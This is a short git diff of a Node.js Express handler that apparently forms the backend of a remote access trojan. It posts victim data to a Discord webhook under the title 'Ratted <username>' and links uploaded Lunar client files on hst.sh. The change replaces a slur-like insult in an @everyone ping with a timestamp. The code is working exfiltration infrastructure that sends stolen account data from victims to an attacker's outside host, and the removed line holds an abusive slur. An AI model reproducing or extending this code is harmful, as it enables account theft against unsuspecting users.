@@ -150,10 +150,13 @@ app.post("/", (req, res) => {
                     checkLunar = 'File not found :( - (Lunar)'
                 else
                     checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`
-                
+
+                // timestamp text
+                let timestamp = `<t:${Date.now() + (24 * 60 * 60 * 1000)}:R>`
+
                 try {
                     post(process.env.WEBHOOK, JSON.stringify({
-                        content: `@everyone - no nw chigger)`, //ping
+                        content: `@everyone - ${timestamp}`, //ping
                         embeds: [{
                             title: `Ratted ${req.body.username} - Click For Stats`,
                              fields: [
